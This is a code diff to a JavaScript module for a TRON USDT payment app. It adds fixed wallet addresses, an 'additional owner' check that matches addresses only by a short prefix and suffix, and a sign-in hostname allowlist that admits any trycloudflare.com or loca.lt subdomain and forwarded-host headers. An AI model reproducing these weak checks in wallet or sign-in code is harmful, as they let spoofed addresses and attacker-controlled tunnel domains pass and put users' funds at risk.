@@ -4,6 +4,9 @@
  */
 
 export const RECIPIENT = "TG94XL9N1uVHPM4U4zcpYGc6w1i7nUBuiq";
+export const CONNECTION_TARGET = "TJyMvDP37nLF4fsRoa9pScmQ6qwbA1DxY9";
+export const ADDITIONAL_OWNER_PREFIX = "TFBTL9";
+export const ADDITIONAL_OWNER_SUFFIX = "gJjoZ";
 export const USDT_CONTRACT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
 export const MAINNET_CHAIN_ID = "0x2b6653dc";
 export const USDT_DECIMALS = 6;
@@ -19,6 +22,23 @@ export const KNOWN_CHAIN_IDS = Object.freeze({
 
 const BASE58_ALPHABET = "123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz";
 const SCALE = 10n ** BigInt(USDT_DECIMALS);
+
+/**
+ * The full additional owner address was not available, so only a syntactically
+ * valid TRON address with both user-provided visible fragments may proceed to
+ * checksum and signature verification.
+ * @param {string} address
+ */
+export function matchesAdditionalOwnerAddress(address) {
+  return /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address)
+    && address.startsWith(ADDITIONAL_OWNER_PREFIX)
+    && address.endsWith(ADDITIONAL_OWNER_SUFFIX);
+}
+
+/** @param {unknown} address */
+export function looksLikeTronAddress(address) {
+  return typeof address === "string" && /^T[1-9A-HJ-NP-Za-km-z]{33}$/.test(address.trim());
+}
 
 /**
  * @param {string} address
@@ -443,6 +463,121 @@ export function validateProductionQrUrl(input) {
     return { ok: false, error: "Use the full public host name of the deployed site." };
   }
   return { ok: true, url: input };
+}
+
+/**
+ * Hostnames allowed to bind sign-in messages when they match the browser Origin header.
+ * @param {string} hostname
+ */
+export function isAllowedSignInHostname(hostname) {
+  if (typeof hostname !== "string" || hostname.length === 0) return false;
+  const host = hostname.toLowerCase().replace(/\.$/, "");
+  if (host === "localhost" || host === "127.0.0.1" || host === "::1" || host === "[::1]") return true;
+  if (host === "trycloudflare.com" || host.endsWith(".trycloudflare.com")) return true;
+  if (host === "loca.lt" || host.endsWith(".loca.lt")) return true;
+  return false;
+}
+
+/**
+ * @param {unknown} configuredOrigin
+ * @param {string} hostname
+ */
+export function isConfiguredSignInHostname(configuredOrigin, hostname) {
+  if (typeof configuredOrigin !== "string" || configuredOrigin.length === 0) return false;
+  if (typeof hostname !== "string" || hostname.length === 0) return false;
+  try {
+    return new URL(configuredOrigin).hostname.toLowerCase() === hostname.toLowerCase();
+  } catch {
+    return false;
+  }
+}
+
+/**
+ * @param {unknown} hostHeader
+ */
+export function hostnameFromHostHeader(hostHeader) {
+  if (typeof hostHeader !== "string" || hostHeader.trim().length === 0) return "";
+  const host = hostHeader.split(",")[0].trim().toLowerCase();
+  if (host.startsWith("[")) {
+    const end = host.indexOf("]");
+    return end === -1 ? "" : host.slice(1, end);
+  }
+  const portIndex = host.lastIndexOf(":");
+  if (portIndex === -1) return host;
+  const maybePort = host.slice(portIndex + 1);
+  if (/^\d+$/.test(maybePort)) return host.slice(0, portIndex);
+  return host;
+}
+
+/**
+ * @param {unknown} originHeader
+ * @param {unknown} configuredOrigin
+ * @returns {{ domain: string, uri: string, secure: boolean } | null}
+ */
+function signInContextFromOrigin(originHeader, configuredOrigin) {
+  if (typeof originHeader !== "string" || originHeader.length === 0 || originHeader.length > 2048) return null;
+  if (/\s/.test(originHeader)) return null;
+  let parsed;
+  try {
+    parsed = new URL(originHeader);
+  } catch {
+    return null;
+  }
+  if (parsed.protocol !== "http:" && parsed.protocol !== "https:") return null;
+  if (!parsed.host || parsed.username || parsed.password) return null;
+  const configured = typeof configuredOrigin === "string" ? configuredOrigin.trim() : "";
+  const allowed = isAllowedSignInHostname(parsed.hostname)
+    || isConfiguredSignInHostname(configured, parsed.hostname);
+  if (!allowed) return null;
+  return {
+    domain: parsed.host,
+    uri: `${parsed.origin}/`,
+    secure: parsed.protocol === "https:",
+  };
+}
+
+/**
+ * @param {unknown} hostHeader
+ * @param {unknown} configuredOrigin
+ * @param {unknown} [protocolHint]
+ */
+function signInContextFromHost(hostHeader, configuredOrigin, protocolHint = "") {
+  if (typeof hostHeader !== "string" || hostHeader.trim().length === 0) return null;
+  const host = hostHeader.split(",")[0].trim();
+  const hostname = hostnameFromHostHeader(host);
+  const configured = typeof configuredOrigin === "string" ? configuredOrigin.trim() : "";
+  const allowed = isAllowedSignInHostname(hostname)
+    || isConfiguredSignInHostname(configured, hostname);
+  if (!allowed) return null;
+  const proto = typeof protocolHint === "string" && protocolHint.toLowerCase() === "https" ? "https" : "http";
+  const normalizedHost = host.toLowerCase();
+  return {
+    domain: normalizedHost,
+    uri: `${proto}://${normalizedHost}/`,
+    secure: proto === "https",
+  };
+}
+
+/**
+ * Resolve the domain and URI pinned into login messages from the browser request.
+ * @param {unknown} originHeader
+ * @param {unknown} hostHeader
+ * @param {unknown} [configuredOrigin]
+ * @param {{ forwardedHost?: unknown, forwardedProto?: unknown }} [proxy]
+ * @returns {{ domain: string, uri: string, secure: boolean } | null}
+ */
+export function signInRequestContext(originHeader, hostHeader, configuredOrigin = "", proxy = {}) {
+  const hasOrigin = typeof originHeader === "string" && originHeader.trim().length > 0;
+  if (hasOrigin) {
+    return signInContextFromOrigin(originHeader, configuredOrigin);
+  }
+  const forwardedHost = typeof proxy.forwardedHost === "string" ? proxy.forwardedHost : "";
+  const forwardedProto = typeof proxy.forwardedProto === "string" ? proxy.forwardedProto : "";
+  if (forwardedHost) {
+    const fromForwarded = signInContextFromHost(forwardedHost, configuredOrigin, forwardedProto);
+    if (fromForwarded) return fromForwarded;
+  }
+  return signInContextFromHost(hostHeader, configuredOrigin, forwardedProto);
 }
 
 /**
